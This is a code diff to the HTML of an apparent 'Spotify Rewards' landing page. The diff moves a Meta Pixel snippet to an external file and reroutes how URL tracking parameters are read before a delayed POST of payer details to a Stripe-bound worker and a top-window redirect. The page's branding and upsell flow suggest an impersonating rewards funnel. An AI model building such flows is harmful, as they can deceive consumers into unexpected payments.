@@ -3,20 +3,7 @@
 <head>
   <script src="/sp/upsell-gate.js"></script>
   <!-- Redirecionador UTM desativado temporariamente -->
-  <!-- Meta Pixel -->
-  <script>
-    !function(f,b,e,v,n,t,s)
-    {if(f.fbq)return;n=f.fbq=function(){n.callMethod?
-    n.callMethod.apply(n,arguments):n.queue.push(arguments)};
-    if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
-    n.queue=[];t=b.createElement(e);t.async=!0;
-    t.src=v;s=b.getElementsByTagName(e)[0];
-    s.parentNode.insertBefore(t,s)}(window, document,'script',
-    'https://connect.facebook.net/en_US/fbevents.js');
-    fbq('init', '1420189650232210');
-    (function(){try{var k='fb_pv_'+location.pathname;if(sessionStorage.getItem(k))return;sessionStorage.setItem(k,'1');var n=0;var t=setInterval(function(){n++;if(window.fbq&&fbq.loaded){clearInterval(t);fbq('track','PageView');}else if(n>80){clearInterval(t);if(window.fbq)fbq('track','PageView');}},250);}catch(e){if(window.fbq)fbq('track','PageView');}})();
-  </script>
-  <noscript><img height="1" width="1" style="display:none" src="https://www.facebook.com/tr?id=1420189650232210&ev=PageView&noscript=1" /></noscript>
+  <script src="/sp/meta-pixel.js"></script>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
   <title>Spotify Rewards - Access Confirmed</title>
@@ -285,7 +272,7 @@
 
       function urlParams() {
         var p = {};
-        try { new URLSearchParams(location.search).forEach(function (v, k) { p[k] = v; }); } catch (e) {}
+        try { new URLSearchParams((window.spTrackingSearch || location.search)).forEach(function (v, k) { p[k] = v; }); } catch (e) {}
         try {
           var raw = localStorage.getItem('funnel_params');
           if (raw) {
@@ -317,7 +304,7 @@
       var email = params.e || params.email || params.payerEmail || '';
 
       function go() {
-        var q = window.location.search || '';
+        var q = (window.spTrackingSearch || window.location.search) || '';
         window.top.location.href = REDIRECT_URL + (q ? (REDIRECT_URL.indexOf('?') > -1 ? '&' : '?') + q.slice(1) : '');
       }
 
@@ -366,10 +353,10 @@
           overlayCount.textContent = 'Finalizing your reward...';
         }, UPSELL_REDIRECT_AT_MS);
 
-        var urlParams = new URLSearchParams(window.location.search);
+        var urlParams = new URLSearchParams((window.spTrackingSearch || window.location.search));
         // ANTIFRAUD DELAY: waits UPSELL_DELAY_MS before sending to Stripe
         setTimeout(function () {
-          fetch(WORKER_URL + window.location.search, {
+          fetch(WORKER_URL + (window.spTrackingSearch || window.location.search), {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({
